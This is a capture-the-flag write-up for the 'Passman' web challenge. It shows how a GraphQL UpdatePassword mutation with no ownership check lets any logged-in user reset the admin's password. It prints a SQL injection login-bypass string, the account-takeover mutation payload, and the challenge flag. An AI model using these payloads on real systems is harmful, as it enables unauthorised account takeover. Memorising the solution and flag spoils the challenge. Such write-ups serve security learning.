# Passman

## Overview

- Overall difficulty for me (From 1-10 stars): ★★★☆☆☆☆☆☆☆

## Background

Pandora discovered the presence of a mole within the ministry. To proceed with caution, she must obtain the master control password for the ministry, which is stored in a password manager. Can you hack into the password manager?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318220014.png)

## Enumeration

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318220042.png)

In here, we see there's a login page.

Whenever I deal with a login page, I always try SQL injection to bypass the authentication, like `' OR 1=1-- -`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318220213.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318220219.png)

Nope.

**Alright, let's read the [source code](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/Web/Passman/web_passman.zip):**
```shell
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Passman)-[2023.03.18|22:02:47(HKT)]
└> file web_passman.zip 
web_passman.zip: Zip archive data, at least v1.0 to extract, compression method=store
┌[siunam♥earth]-(~/ctf/Cyber-Apocalypse-2023/Web/Passman)-[2023.03.18|22:02:50(HKT)]
└> unzip web_passman.zip 
Archive:  web_passman.zip
   creating: web_passman/
   creating: web_passman/config/
  inflating: web_passman/config/supervisord.conf  
  inflating: web_passman/Dockerfile  
  inflating: web_passman/build-docker.sh  
   creating: web_passman/challenge/
  inflating: web_passman/challenge/database.js  
   creating: web_passman/challenge/middleware/
  inflating: web_passman/challenge/middleware/AuthMiddleware.js  
  inflating: web_passman/challenge/index.js  
  inflating: web_passman/challenge/package.json  
   creating: web_passman/challenge/static/
   creating: web_passman/challenge/static/vendors/
   creating: web_passman/challenge/static/vendors/mdi/
   creating: web_passman/challenge/static/vendors/mdi/css/
  inflating: web_passman/challenge/static/vendors/mdi/css/materialdesignicons.min.css  
  inflating: web_passman/challenge/static/vendors/mdi/css/materialdesignicons.min.css.map  
   creating: web_passman/challenge/static/vendors/mdi/fonts/
  inflating: web_passman/challenge/static/vendors/mdi/fonts/materialdesignicons-webfont.woff2  
  inflating: web_passman/challenge/static/vendors/mdi/fonts/materialdesignicons-webfont.svg  
  inflating: web_passman/challenge/static/vendors/mdi/fonts/materialdesignicons-webfont.eot  
  inflating: web_passman/challenge/static/vendors/mdi/fonts/materialdesignicons-webfont.woff  
  inflating: web_passman/challenge/static/vendors/mdi/fonts/materialdesignicons-webfont.ttf  
   creating: web_passman/challenge/static/vendors/base/
  inflating: web_passman/challenge/static/vendors/base/vendor.bundle.base.js  
  inflating: web_passman/challenge/static/vendors/base/vendor.bundle.base.css  
   creating: web_passman/challenge/static/css/
  inflating: web_passman/challenge/static/css/bootstrap.min.css  
  inflating: web_passman/challenge/static/css/normalize.min.css  
  inflating: web_passman/challenge/static/css/canvas.css  
  inflating: web_passman/challenge/static/css/style.css  
   creating: web_passman/challenge/static/images/
  inflating: web_passman/challenge/static/images/logo.png  
   creating: web_passman/challenge/static/js/
  inflating: web_passman/challenge/static/js/off-canvas.js  
  inflating: web_passman/challenge/static/js/register.js  
  inflating: web_passman/challenge/static/js/login.js  
  inflating: web_passman/challenge/static/js/particles.min.js  
  inflating: web_passman/challenge/static/js/hoverable-collapse.js  
  inflating: web_passman/challenge/static/js/dashboard.js  
  inflating: web_passman/challenge/static/js/template.js  
  inflating: web_passman/challenge/static/js/app.js  
  inflating: web_passman/challenge/static/js/jquery.js  
   creating: web_passman/challenge/static/fonts/
   creating: web_passman/challenge/static/fonts/Roboto/
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Medium.ttf  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Light.woff2  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Light.ttf  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Regular.woff2  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Regular.woff  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Light.woff  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Medium.woff2  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Regular.ttf  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Light.eot  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Medium.eot  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Black.woff2  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Regular.eot  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Bold.woff2  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Black.woff  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Bold.eot  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Medium.woff  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Black.eot  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Bold.woff  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Bold.ttf  
  inflating: web_passman/challenge/static/fonts/Roboto/Roboto-Black.ttf  
   creating: web_passman/challenge/views/
  inflating: web_passman/challenge/views/register.html  
  inflating: web_passman/challenge/views/login.html  
  inflating: web_passman/challenge/views/dashboard.html  
   creating: web_passman/challenge/routes/
  inflating: web_passman/challenge/routes/index.js  
   creating: web_passman/challenge/helpers/
  inflating: web_passman/challenge/helpers/GraphqlHelper.js  
  inflating: web_passman/challenge/helpers/JWTHelper.js  
  inflating: web_passman/entrypoint.sh
```

**In `entrypoint.sh`, we can see the MySQL database schema, and where's the flag:**
```bash
mysql -u root << EOF
CREATE DATABASE passman;

CREATE TABLE passman.users (
    id          INT NOT NULL AUTO_INCREMENT,
    username    VARCHAR(256) UNIQUE NOT NULL,
    password    VARCHAR(256) NOT NULL,
    email       VARCHAR(256) UNIQUE NOT NULL,
    is_admin    INT NOT NULL DEFAULT 0,
    PRIMARY KEY (id)
);

INSERT INTO passman.users (username, password, email, is_admin)
VALUES
    ('admin', '$(genPass)', 'admin@passman.htb', 1),
    ('louisbarnett', '$(genPass)', 'louis_p_barnett@mailinator.com', 0),
    ('ninaviola', '$(genPass)', 'ninaviola57331@mailinator.com', 0),
    ('alvinfisher', '$(genPass)', 'alvinfisher1979@mailinator.com', 0);


CREATE TABLE IF NOT EXISTS passman.saved_passwords (
    id         INT NOT NULL AUTO_INCREMENT,
    owner      VARCHAR(256) NOT NULL,
    type       VARCHAR(256) NOT NULL,
    address    VARCHAR(256) NOT NULL,
    username   VARCHAR(256) NOT NULL,
    password   VARCHAR(256) NOT NULL,
    note       VARCHAR(256) NOT NULL,
    PRIMARY KEY (id)
);

INSERT INTO passman.saved_passwords (owner, type, address, username, password, note)
VALUES
    ('admin', 'Web', 'igms.htb', 'admin', 'HTB{f4k3_fl4g_f0r_t3st1ng}', 'password'),
    ('louisbarnett', 'Web', 'spotify.com', 'louisbarnett', 'YMgC41@)pT+BV', 'student sub'),
    ('louisbarnett', 'Email', 'dmail.com', 'louisbarnett@dmail.com', 'L-~I6pOy42MYY#y', 'private mail'),
    ('ninaviola', 'Web', 'office365.com', 'ninaviola1', 'OfficeSpace##1', 'company email'),
    ('alvinfisher', 'App', 'Netflix', 'alvinfisher1979', 'efQKL2pJAWDM46L7', 'Family Netflix'),
    ('alvinfisher', 'Web', 'twitter.com', 'alvinfisher1979', '7wYz9pbbaH3S64LG', 'old twitter account');

GRANT ALL ON passman.* TO 'passman'@'%' IDENTIFIED BY 'passman' WITH GRANT OPTION;
FLUSH PRIVILEGES;
EOF
```

That being said, **our goal seems like is to login as user `admin`.**

**Also, in `views/database.js`, ALL SQL query are prepared:**
```js
[...]
async registerUser(email, username, password) {
    return new Promise(async (resolve, reject) => {
        let stmt = `INSERT INTO users(email, username, password) VALUES(?, ?, ?)`;
        this.connection.query(
            stmt,
            [
                String(email),
                String(username),
                String(password)
            ],
            (err, _) => {
                if(err)
                    reject(err);
                resolve()
            }
        )
    });
}
[...]
```

Which means **we can't do SQL injection** on those SQL queries.

**However, I notice something interesting in function `loginUser()`:**
```js
async loginUser(username, password) {
    return new Promise(async (resolve, reject) => {
        let stmt = `SELECT username, is_admin FROM users WHERE username = ? and password = ?`;
        this.connection.query(
            stmt,
            [
                String(username),
                String(password)
            ],
            (err, result) => {
                if(err)
                    reject(err)
                try {
                    resolve(JSON.parse(JSON.stringify(result)))
                }
                catch (e) {
                    reject(e)
                }
            }
        )
    });
}
```

As you can see, **the SQL query is SELECT'ing column `is_admin`.**

Hmm... Can we abuse that??

**Now, let's register an account, and start to poke around:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318221304.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318221314.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318221332.png)

Then, login:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318221400.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318221411.png)

We can view and add new phrases in here.

**After poking around, I found something stands out:**
```js
async updatePassword(username, password) {
    return new Promise(async (resolve, reject) => {
        let stmt = `UPDATE users SET password = ? WHERE username = ?`;
        this.connection.query(
            stmt,
            [
                String(password),
                String(username)
            ],
            (err, _) => {
                if(err)
                    reject(err)
                resolve();
            }
        )
    });
}
```

Hmm? **Update password? And no validation at all??**

**In the Burp Suite HTTP history, when we click the "LOGIN" button, it'll send a POST request to `/grahpql`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318223404.png)

> Note: It's highlighted in green because of the "JSON Web Tokens" extension.

Umm... I know nothing about GrahpQL...

**Let's look at the [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/graphql) note!**

> GraphQL acts as an alternative to REST API. Rest APIs require the client to send multiple requests to different endpoints on the API to query data from the backend database. With graphQL you only need to send one request to query the backend. This is a lot simpler because you don’t have to send multiple requests to the API, a single request can be used to gather all the necessary information.
>  
> As new technologies emerge so will new vulnerabilities. By **default** graphQL does **not** implement **authentication**, this is put on the developer to implement. This means by default graphQL allows anyone to query it, any sensitive information will be available to attackers unauthenticated.
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318223555.png)
>  
> Once you find an open graphQL instance you need to know **what queries it supports**.

**In `helps/GraphqlHelper.js`, we see this:**
```js
const PhraseSchema = new GraphQLObjectType({
    name: 'Phrases',
    fields: {
        id:         { type: GraphQLID },
        owner:      { type: GraphQLString },
        type:       { type: GraphQLString },
        address:    { type: GraphQLString },
        username:   { type: GraphQLString },
        password:   { type: GraphQLString },
        note:       { type: GraphQLString }
    }
});

const ResponseType = new GraphQLObjectType({
    name: 'Response',
    fields: {
        message:         { type: GraphQLString },
        token:           { type: GraphQLString }
    }
});

const queryType = new GraphQLObjectType({
    name: 'Query',
    fields: {
        getPhraseList: {
            type: new GraphQLList(PhraseSchema),
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.getPhraseList(request.user.username)
                        .then(rows => resolve(rows))
                        .catch(err => reject(new GraphQLError(err)))
                });
            }
        }
    }
});

const mutationType = new GraphQLObjectType({
    name: 'Mutation',
    fields: {
        RegisterUser: {
            type: ResponseType,
            args: {
                email: { type: new GraphQLNonNull(GraphQLString) },
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.registerUser(args.email, args.username, args.password)
                        .then(() => resolve(response("User registered successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        LoginUser: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    db.loginUser(args.username, args.password)
                        .then(async (user) => {
                            if (user.length) {
                                let token = await JWTHelper.sign( user[0] );
                                resolve({
                                    message: "User logged in successfully!",
                                    token: token
                                });
                            };
                            reject(new Error("Username or password is invalid!"));
                        })
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        UpdatePassword: {
            type: ResponseType,
            args: {
                username: { type: new GraphQLNonNull(GraphQLString) },
                password: { type: new GraphQLNonNull(GraphQLString) }
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.updatePassword(args.username, args.password)
                        .then(() => resolve(response("Password updated successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },

        AddPhrase: {
            type: ResponseType,
            args: {
                recType: { type: new GraphQLNonNull(GraphQLString) },
                recAddr: { type: new GraphQLNonNull(GraphQLString) },
                recUser: { type: new GraphQLNonNull(GraphQLString) },
                recPass: { type: new GraphQLNonNull(GraphQLString) },
                recNote: { type: new GraphQLNonNull(GraphQLString) },
            },
            resolve: async (root, args, request) => {
                return new Promise((resolve, reject) => {
                    if (!request.user) return reject(new GraphQLError('Authentication required!'));

                    db.addPhrase(request.user.username, args)
                        .then(() => resolve(response("Phrase added successfully!")))
                        .catch(err => reject(new GraphQLError(err)));
                });
            }
        },
    }
});
```

Now we know the server's phrase schema, response type, query type, but what is ***mutation type***??

> **Mutations are used to make changes in the server-side.**
>  
> In the **introspection** you can find the **declared** **mutations**. In the following image the "_MutationType_" is called "_Mutation_" and the "_Mutation_" object contains the names of the mutations (like "_addPerson_" in this case):
>  
> ![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318223906.png)
>   
> For this example imagine a data base with **persons** identified by the email and the name and **movies** identified by the name and rating. A **person** can be **friend** with other **persons** and a person can **have movies**.
>   
> A mutation to **create new** movies inside the database can be like the following one (in this example the mutation is called `addMovie`):

```js
mutation {
  addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
    movies {
      name
      rating
    }
  }
}
```

> Note how both the values and type of data are indicated in the query.
>   
> There may also be also a **mutation** to **create** **persons** (called `addPerson` in this example) with friends and files (note that the friends and films have to exist before creating a person related to them):

```js
mutation {
  addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
    person {
      name
      email
      friends {
        edges {
          node {
            name
            email
          }
        }
      }
      subscribedMovies {
        edges {
          node {
            name
            rating
            releaseYear
          }
        }
      }
    }
  }
}
```

Armed with above information, we can see there are 4 mutations: `RegisterUser`, `LoginUser`, ***`UpdatePassword`***, `AddPhrase`.

## Exploitation

**Since the `UpdatePassword` looks very, very interesting for us, let's dive in to that!**
```js
UpdatePassword: {
    type: ResponseType,
    args: {
        username: { type: new GraphQLNonNull(GraphQLString) },
        password: { type: new GraphQLNonNull(GraphQLString) }
    },
    resolve: async (root, args, request) => {
        return new Promise((resolve, reject) => {
            if (!request.user) return reject(new GraphQLError('Authentication required!'));

            db.updatePassword(args.username, args.password)
                .then(() => resolve(response("Password updated successfully!")))
                .catch(err => reject(new GraphQLError(err)));
        });
    }
},
```

We can see that it requires 2 arguments: `username`, `password`. Then, it'll update the password using the `updatePassword()` function from `db`.

Now, since ***there's no validation, no check for correct username, we can update any users' password!***

**That being said, we can first try to update our own password!**
```json
{
    "query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }",
    "variables": {
        "username": "siunam",
        "password": "password123"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224304.png)

No error! Let's login with the new password:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224414.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224419.png)

It worked!!!

**With that said, we can update user `admin`'s password!! (Username was found from `entrypoint.sh`)**
```json
{
    "query": "mutation($username: String!, $password: String!) { UpdatePassword(username: $username, password: $password) { message, token } }",
    "variables": {
        "username": "admin",
        "password": "pwned"
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224529.png)

**Login as `admin`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224544.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224554.png)

Nice!!! We're `admin` now!!

**Let's read the flag:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224613.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Cyber-Apocalypse-2023/images/Pasted%20image%2020230318224618.png)

- **Flag: `HTB{1d0r5_4r3_s1mpl3_4nd_1mp4ctful!!}`**

## Conclusion

What we've learned:

1. Leveraging GraphQL To Update Arbitrary User's Password